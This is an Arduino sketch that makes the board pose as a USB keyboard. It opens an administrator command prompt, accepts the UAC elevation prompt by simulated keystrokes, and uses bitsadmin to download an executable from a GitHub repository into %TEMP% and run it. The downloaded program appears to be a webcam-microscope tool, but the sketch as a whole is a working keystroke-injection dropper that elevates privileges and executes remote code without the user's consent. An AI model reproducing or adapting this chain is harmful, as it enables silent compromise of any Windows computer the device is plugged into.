#include "Keyboard.h"
int val=0, ledPin=6, potPin=2, buttonPin=3, i=0, buttonState=0;
char n;
void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup()
{
  pinMode(buttonPin, INPUT);
  pinMode(ledPin, OUTPUT);
  
  delay(10000);
  Keyboard.begin();

  delay(500);

  delay(3000);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();

  delay(1000);

  Keyboard.print("cmd");

  delay(1000);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(1000);
  
  typeKey(KEY_LEFT_ARROW);

  typeKey(KEY_RETURN);

  delay(300);
  
  Keyboard.print("bitsadmin /transfer mic /priority high https://github.com/ComputerMasterPvP/WebcamMicroscope/raw/master/Microscopio_E.exe %TEMP%\\mic.exe");
  
  typeKey(KEY_RETURN);
  
  delay(15000);
  
  Keyboard.print("%TEMP%\\mic.exe");

  typeKey(KEY_RETURN);

  delay(300);
  do{
  val=analogRead(potPin);
  analogWrite(ledPin, val/4);
  }while(true);

  Keyboard.end();
}

void loop() {
  }

